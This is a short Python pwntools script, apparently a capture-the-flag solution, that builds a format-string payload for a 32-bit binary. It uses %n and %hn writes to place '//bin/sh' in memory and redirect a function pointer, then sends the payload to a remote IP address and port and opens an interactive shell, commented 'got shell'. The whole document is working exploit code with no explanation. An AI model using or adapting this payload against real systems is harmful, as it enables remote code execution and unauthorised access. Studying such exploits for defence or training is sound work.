from pwn import *

write_0x100_addr = p32(0x0804A02b)
choose_arg = 0x080486C7
function_pointer = p32(choose_arg)
bin_sh_addr = 0x0804A020
arg_addr = 0x0804A030

payload  = write_0x100_addr
payload += "%"+str(0x100-4)+"p"+ "%20$n"
payload = payload.ljust(20, "A")
payload += function_pointer
payload += p32(arg_addr+2)
payload += p32(arg_addr)
payload += p32(bin_sh_addr+4)
payload += p32(bin_sh_addr)
payload += p32(bin_sh_addr+6)
payload += p32(bin_sh_addr+2)
#written 0x122 = 290

payload += "%1762p"
payload += "%26$hn"
#written 0x804

payload += "%10027p"
payload += "%28$hn"
#written 0x2f2f

payload += "%13056p"
payload += "%29$hn"
#written 0x622f

payload += "%1604p"
payload += "%30$hn"
#written 0x6873

payload += "%1526p"
payload += "%31$hn"
#written 0x6e69

payload += "%12727p"
payload += "%27$hn"


p = remote("37.139.17.37", 7331)
p.sendline(payload)
p.interactive() # got shell
p.close()
